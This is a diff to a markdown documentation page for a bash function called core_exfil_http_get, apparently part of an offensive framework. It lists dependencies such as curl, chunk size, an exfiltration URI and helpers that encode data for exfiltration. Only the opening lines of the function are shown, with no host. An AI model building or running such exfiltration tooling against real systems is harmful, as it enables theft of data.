@@ -1,15 +1,25 @@
 # Exfil Http Get
 
-## Purpose
-
+### Purpose
 core_exfil_http_get function implementation from base.sh.
 
-## Implementation
+### Dependencies
+| Type | Name | Value |
+|------|------|-------|
+| Global Variable | `CHUNK_SIZE` | 50 |
+| Global Variable | `CMD_CURL` | "curl" |
+| Global Variable | `CMD_SLEEP` | "sleep" |
+| Global Variable | `ENCODING_TYPE` | "none" |
+| Global Variable | `EXFIL_URI` | "" |
+| Global Variable | `JOB_ID` | "" |
+| Function | `core_exfil_http_get()` | For exfil http get |
+| Function | `core_normalize_uri()` | For normalize uri |
+| Function | `core_prepare_exfil_data()` | For prepare exfil data |
+| Function | `core_url_safe_encode()` | For url safe encode |
 
 <details>
-<summary>Function Code</summary>
 
-```bash
+```shell
 core_exfil_http_get() {
 local data="$1"
     local full_uri=$(core_normalize_uri "$EXFIL_URI")
@@ -80,12 +90,4 @@ local data="$1"
 }
 ```
 
-</details>
-
-## Usage
-
-Document usage examples and parameters here.
-
-## Notes
-
-Add any implementation notes or considerations.
+</details> 
